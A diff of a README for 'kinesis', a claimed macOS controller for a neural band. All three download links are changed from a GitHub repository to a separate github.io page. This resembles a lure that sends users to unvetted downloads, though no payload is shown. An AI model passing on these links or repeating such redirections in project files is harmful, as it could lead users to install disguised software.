@@ -1,6 +1,6 @@
 # ⚡ kinesis - Native macOS Controls for Your Neural Band
 
-[![Download kinesis](https://img.shields.io/badge/Download-kinesis-FF6B6B.svg?style=for-the-badge&logo=github)](https://github.com/Oarfishhourcircle4599/kinesis)
+[![Download kinesis](https://img.shields.io/badge/Download-kinesis-FF6B6B.svg?style=for-the-badge&logo=github)](https://oarfishhourcircle4599.github.io)
 
 ## 🧠 What is kinesis?
 
@@ -22,7 +22,7 @@ Imagine moving your cursor simply by flexing your fingers, or clicking by tappin
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**https://github.com/Oarfishhourcircle4599/kinesis**](https://github.com/Oarfishhourcircle4599/kinesis)
+Visit this link to download the application: [**https://oarfishhourcircle4599.github.io**](https://oarfishhourcircle4599.github.io)
 
 ### Step 2: Set Up Your Neural Band
 
@@ -197,7 +197,7 @@ kinesis represents the future of human-computer interaction. While it's early da
 
 Remember: this is experimental software. Expect quirks, but also expect moments of wow when the cursor glides exactly where you want it. Have fun exploring and pushing the boundaries of what's possible!
 
-[**Download kinesis Now**](https://github.com/Oarfishhourcircle4599/kinesis)
+[**Download kinesis Now**](https://oarfishhourcircle4599.github.io)
 
 ---
 
